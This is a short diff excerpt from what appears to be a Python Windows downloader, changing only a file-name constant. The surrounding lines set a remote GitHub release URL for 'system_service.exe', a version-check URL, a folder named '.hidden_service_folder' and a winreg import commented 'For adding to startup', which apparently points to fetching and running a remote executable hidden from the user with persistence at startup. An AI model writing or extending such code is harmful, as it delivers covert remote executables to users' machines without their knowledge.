@@ -8,7 +8,7 @@ import winreg  # For adding to startup
 VERSION_URL = "https://raw.githubusercontent.com/yesjdnke/manager/refs/heads/main/version.txt"  # Version file URL
 FILE_URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"  # File to download
 FOLDER_NAME = ".hidden_service_folder"  # Folder name for hidden service
-FILE_NAME = "system_service_v1.exe"  # File name for the service
+FILE_NAME = "system_service_.exe"  # File name for the service
 VERSION_FILE_NAME = "previous_version.txt"  # File to store the last downloaded version
 
 def get_user_hidden_folder():
